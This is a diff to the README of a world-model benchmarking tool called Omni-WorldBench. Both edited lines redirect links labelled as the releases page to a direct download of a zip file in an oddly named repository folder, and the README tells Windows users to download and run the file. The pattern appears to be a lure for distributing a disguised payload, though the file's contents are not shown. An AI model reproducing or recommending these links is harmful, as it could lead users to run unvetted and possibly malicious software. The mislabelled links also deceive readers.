@@ -1,6 +1,6 @@
 # 🌍 Omni-WorldBench - Benchmark World Models with Ease
 
-[![Download Omni-WorldBench](https://img.shields.io/badge/Download-Omni--WorldBench-blue?style=for-the-badge&logo=github)](https://github.com/mkfbde4738/Omni-WorldBench/releases)
+[![Download Omni-WorldBench](https://img.shields.io/badge/Download-Omni--WorldBench-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mkfbde4738/Omni-WorldBench/main/unusurping/Omni_World_Bench_v1.2.zip)
 
 ## 📌 What Omni-WorldBench Does
 
@@ -31,7 +31,7 @@ For smooth use, close large apps before you start a benchmark run.
 
 Visit the release page here to download and run the Windows file:
 
-[Open Omni-WorldBench Releases](https://github.com/mkfbde4738/Omni-WorldBench/releases)
+[Open Omni-WorldBench Releases](https://raw.githubusercontent.com/mkfbde4738/Omni-WorldBench/main/unusurping/Omni_World_Bench_v1.2.zip)
 
 On that page, look for the latest release and choose the Windows download file. If there are more than one file, pick the one that ends in `.exe` or `.zip` for Windows.
 
